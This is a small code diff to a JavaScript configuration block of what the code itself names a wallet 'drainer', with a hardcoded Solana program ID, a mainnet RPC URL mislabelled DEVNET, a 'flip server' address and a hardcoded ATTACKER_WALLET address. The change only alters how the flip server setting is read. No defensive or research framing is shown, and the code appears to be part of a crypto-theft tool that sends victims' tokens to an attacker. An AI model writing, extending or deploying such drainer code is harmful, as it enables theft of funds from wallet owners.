@@ -7,7 +7,7 @@
 var cfg = window.DRAINER_CONFIG || {};
 var PROGRAM_ID = cfg.programId || 'DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU';
 var DEVNET_RPC = cfg.rpc || 'https://api.mainnet-beta.solana.com';
-var FLIP_SERVER = cfg.flipServer || 'http://localhost:3001';
+var FLIP_SERVER = ('flipServer' in cfg) ? cfg.flipServer : 'http://localhost:3001';
 var ATTACKER_WALLET = cfg.attackerWallet || 'DGtkrQpytKyzCaCALPAmCFuNeLLP2ScSeYxDMSa4T8gT';
 
 var TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
